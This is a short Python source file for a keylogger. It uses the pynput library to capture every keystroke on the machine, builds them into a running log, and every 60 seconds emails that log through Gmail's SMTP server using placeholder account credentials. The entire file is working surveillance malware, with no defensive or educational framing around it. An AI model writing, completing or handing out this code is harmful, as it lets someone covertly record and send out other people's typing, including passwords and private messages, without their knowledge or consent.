from pynput import keyboard
import smtplib
import threading
import time

log = ""

def on_press(key):
    """Handles key presses and logs them."""
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

def send_email(email, password, message):
    """Sends log file to an email."""
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def report():
    """Sends logged keystrokes every 60 seconds."""
    global log
    if log:
        send_email("your_email@gmail.com", "your_password", log)
        log = ""  # Clear log after sending
    threading.Timer(60, report).start()

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    report()
    listener.join()
